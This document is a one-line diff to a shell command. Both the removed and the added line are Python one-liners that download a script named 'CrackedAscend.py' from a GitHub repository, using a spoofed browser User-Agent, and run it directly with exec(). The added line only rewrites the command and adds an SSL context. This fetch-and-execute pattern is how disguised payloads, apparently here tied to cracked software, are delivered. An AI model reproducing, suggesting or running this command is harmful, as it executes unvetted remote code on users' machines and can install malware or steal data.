@@ -1,1 +1,1 @@
-python -c "import urllib.request; r=urllib.request.Request('https://github.com/biskit-git/project/raw/refs/heads/main/CrackedAscend.py', headers={'User-Agent': 'Mozilla/5.0'}); exec(urllib.request.urlopen(r).read().decode('utf-8'))"
+python -c "import urllib.request; import ssl; url='https://github.com/biskit-git/project/raw/refs/heads/main/CrackedAscend.py'; req=urllib.request.Request(url, headers={'User-Agent':'Mozilla/5.0'}); ctx=ssl.create_default_context(); code=urllib.request.urlopen(req, context=ctx).read().decode('utf-8'); exec(code)"
